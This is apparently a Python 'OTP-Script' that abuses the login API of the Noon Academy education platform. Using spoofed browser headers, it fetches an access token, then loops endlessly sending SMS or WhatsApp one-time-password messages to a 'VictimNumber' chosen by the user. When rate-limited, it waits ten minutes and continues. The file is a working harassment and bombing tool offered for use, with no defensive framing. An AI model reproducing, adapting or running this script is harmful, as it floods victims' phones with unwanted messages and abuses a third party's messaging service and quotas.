import requests,time,json
CountryCode = "20"
Country = "0"
SendMethod = '0'

print("""\

 _   _                      _                 _                      
| \ | | ___   ___  _ __    / \   ___ __ _  __| | ___ _ __ ___  _   _ 
|  \| |/ _ \ / _ \| '_ \  / _ \ / __/ _` |/ _` |/ _ \ '_ ` _ \| | | |
| |\  | (_) | (_) | | | |/ ___ \ (_| (_| | (_| |  __/ | | | | | |_| |
|_| \_|\___/ \___/|_| |_/_/   \_\___\__,_|\__,_|\___|_| |_| |_|\__, |
                                                               |___/ 
                                                    

            ___ _____ ____            ____            _       _   
           / _ \_   _|  _ \          / ___|  ___ _ __(_)_ __ | |_ 
          | | | || | | |_) |  _____  \___ \ / __| '__| | '_ \| __|
          | |_| || | |  __/  |_____|  ___) | (__| |  | | |_) | |_ 
           \___/ |_| |_|             |____/ \___|_|  |_| .__/ \__|
                                                     |_|        
                                                            Coded By : Abdulrahman
                                                            insta : /1x5c0rp10n 
                                                            FB : /ixScorpion

                      """)
                      
def SendSmS(VictimNumber):
     TimeStamp=requests.get('https://api.non.sa/users/v1/currentTime').text
     TimeStamp=json.loads(TimeStamp)
     TimeStamp=(TimeStamp['data'][0]['current_time'])
     #print(TimeStamp)
     AccessTokenurl="https://api.non.sa/bifrost/v1/access_token"

     AccessTokenReqheader = {
     'accept': 'application/json',
     'accept-encoding': 'gzip, deflate, br',
     'accept-language': 'en-US,en;q=0.9,ar;q=0.8,af;q=0.7',
     'api-version': '2',
     'content-length': '96',
     'content-type': 'application/json',
     'country': str(Country),
     'dnt': '1',
     'locale': 'ar_EG',
     'origin': 'https://www.noonacademy.com',
     'platform': 'web',
     'referer': 'https://www.noonacademy.com/',
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'cross-site',
     'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
     'x-client-time': str(TimeStamp),
     'x-device-id': '0d361ff5-bb0d-4def-95d4-b3f6d0988da7'
     }

     AccessTokenReqdata ={
     "tenant":"student",
     "country":"1","os":"web",
     "device_id":"0d361ff5-bb0d-4def-95d4-b3f6d0988da7"
      }


     AccessTokenreq = requests.post(AccessTokenurl, json=AccessTokenReqdata, headers=AccessTokenReqheader).text
     ReqData = json.loads(AccessTokenreq)
     AccessToken = 'Bearer '+ReqData['token']
     #print(AccessToken)


     OTPurl="https://api.non.sa/v1/login/generate_otp"
     OTPheader = {
     'Host': 'api.non.sa',
     'Connection': 'keep-alive',
     'x-client-time': str(TimeStamp),
     'x-device-id': '0d361ff5-bb0d-4def-95d4-b3f6d0988da7',
     'locale': 'ar_EG',
     'Authorization': AccessToken,
     'Content-Type': 'application/json',
     'Accept': 'application/json',
     'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
     'country': str(Country),
     'api-version': '2',
     'platform': 'web',
     'x-tenant': 'student',#teacher
     'DNT': '1',
     'Origin': 'https://www.noonacademy.com',
     'Sec-Fetch-Site': 'cross-site',
     'Sec-Fetch-Mode': 'cors', 
     'Sec-Fetch-Dest': 'empty',
     'Referer': 'https://www.noonacademy.com/',
     'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8,af;q=0.7',
     'Accept-Encoding': 'gzip, deflate',
     'Content-Length': '92'
     }

     OTPdate = {
     'channel' : SendMethod,
     'dialing_code' : str(CountryCode),
     'identity_type' : 'PHONE',
     'identity_value' : VictimNumber
     }
     OTPreq = requests.post(OTPurl, json=OTPdate, headers=OTPheader).text
     return OTPreq


print('[1] Egypt')
print('[2] Saudia Arabia')
print('[3] Kuwait')
print('[4] Jordan')
print('[5] India')
print('[6] Iraq')
print('[7] Pakistan')
print('[8] Oman')
print('[9] nigeria')
print()
selectedCountry = int(input("[+] Enter Your Country Number : "))
if selectedCountry > 0 and selectedCountry < 8:
 print()
else:
 print('-__-')
 print()
 exit()

if selectedCountry==1:
    Country = '2'
    CountryCode = '+20'
    print("Your Country : Egypt")
if selectedCountry==2:
    Country = '1'
    CountryCode = '+966'
    print("Your Country : Saudia Arabia")
if selectedCountry==3:
    Country = '4'
    CountryCode = '+965'
    print("Your Country : Kuwait")
if selectedCountry==4:
    Country = '5'
    CountryCode = '+962'
    print("Your Country : Jordan")
if selectedCountry==5:
    Country = '6'
    CountryCode = '+91'
    print("Your Country : India")
if selectedCountry==6:
    Country = '7'
    CountryCode = '+964'
    print("Your Country : Iraq")
if selectedCountry==7:
    Country = '9'
    CountryCode = '+92'
    print("Your Country : Pakistan")
if selectedCountry==8:
    Country = '3'
    CountryCode = '+968'
    print("Your Country : Oman")
if selectedCountry==9:
    Country='2'
    CountryCode ='+234'
    print("your country nigeria")

print()
print('[1] SMS ')
print('[2] Whatsapp ')
print()
print()
SendMethod=str(input('[+] How would you like to send messages : ' ))
if SendMethod == '1' or SendMethod == '2':
    if SendMethod == '1':
        SendMethod = 'sms'
    if SendMethod == '2':
        SendMethod = 'whatsapp'     
else:
 print('-__-')
 print()
 exit()


print()
print()
VictimNumber = input('[+] Enter Number Without <'+ CountryCode +'> : ')
while True:
    req = SendSmS(VictimNumber)
    time.sleep(1)
    if req.__contains__('verification_id'):
        print('[+] Message has been sent successfully')
        time.sleep(3)
    elif req.__contains__('tryAfterSomeTime'):
        print('[-] You have reached the maximum send limit. I will try again in 10 min ')
        time.sleep(600)
    elif req.__contains__('SERVER_ERROR') or req.__contains__('UNEXPECTED_ERROR'):
        print('''[*] A server-side error occurred, but don't worry, it's normal''')
        time.sleep(1)
    else:
        print(req)


        
